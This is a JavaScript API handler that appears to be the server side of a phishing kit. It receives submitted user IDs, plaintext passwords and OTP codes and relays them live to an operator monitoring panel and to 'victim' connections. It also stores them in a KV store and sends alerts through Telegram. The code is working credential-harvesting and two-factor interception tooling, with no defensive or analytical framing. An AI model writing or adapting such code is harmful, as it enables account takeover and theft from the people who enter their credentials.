// Activity broadcast endpoint
// Accepts activity data and broadcasts to all connected SSE clients
// Credentials exist only in memory during broadcast - never stored

import { publishActivity, triggerMemorySubscribers } from './kv-client';
import { notifyActivity } from './telegram';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

// In-memory store for active SSE connections
const sseConnections = new Set();

export function addSSEConnection(res) {
  sseConnections.add(res);
  
  // Remove connection when client disconnects
  res.on('close', () => {
    sseConnections.delete(res);
  });
}

export function broadcastToSSE(data) {
  const message = `data: ${JSON.stringify(data)}\n\n`;
  
  console.log('[broadcast] Broadcasting message:', JSON.stringify(data));
  
  // Broadcast to monitoring panel SSE connections
  sseConnections.forEach(res => {
    try {
      res.write(message);
    } catch (error) {
      // Connection closed, remove it
      sseConnections.delete(res);
    }
  });
  
  // CRITICAL: Also trigger memory event subscribers (for victim SSE connections)
  console.log('[broadcast] Triggering memory subscribers...');
  triggerMemorySubscribers(data);
  console.log('[broadcast] Memory subscribers triggered');
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { type, userId, additionalData } = req.body;
    
    // Create activity object
    const activity = {
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
      type,
      userId,
      timestamp: new Date().toISOString(),
      hasPassword: additionalData?.hasPassword || false,
      // Include password in activity for real-time display (exists only in memory)
      password: additionalData?.password || null,
      otpCode: additionalData?.otpCode || null
    };
    
    // Broadcast immediately to SSE clients (fastest path)
    broadcastToSSE({
      type: 'activity',
      data: activity
    });
    
    // Publish to KV in parallel (don't wait)
    publishActivity(activity).catch(err => {
      console.error('Error publishing to KV (non-blocking):', err);
    });
    
    // Send Telegram notification for userid activities (don't wait)
    if (activity.type === 'userid') {
      notifyActivity(activity).catch(err => {
        console.error('Error sending Telegram notification (non-blocking):', err);
      });
    }
    
    // Respond immediately
    res.status(200).json({ success: true, activity: { id: activity.id, type: activity.type } });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

